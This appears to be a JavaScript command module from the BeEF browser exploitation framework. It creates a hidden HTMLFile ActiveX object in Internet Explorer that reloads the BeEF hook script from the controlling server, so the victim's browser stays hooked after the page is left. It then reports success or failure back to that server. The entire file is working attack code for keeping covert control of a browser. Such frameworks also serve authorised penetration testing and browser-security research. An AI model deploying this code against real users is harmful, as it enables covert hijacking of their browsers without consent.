//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  try {
    var hook_url = beef.net.httpproto + '://' + beef.net.host+ ':' + beef.net.port + beef.net.hook;

    // create HMTL document
    beef.debug("[Invisible HTMLFile ActiveX] Creating HTMLFile ActiveX object");
    doc = new ActiveXObject("HtmlFile");
    doc.open();
    doc.write('<html><body><script src="'+hook_url+'"><\/script></body></html>');
    doc.close();

    // Save a self-reference
    doc.Script.doc = doc;
 
    // Prevent IE from destroying the previous reference
    window.open("","_self");
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "success=created HTMLFile ActiveX object", beef.are.status_success());
  } catch (e) {
    beef.debug("[Invisible HTMLFile ActiveX] could not create HTMLFile ActiveX object: "+e.message)
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=could not create HTMLFile ActiveX object: " + e.message, beef.are.status_error());
  }
});
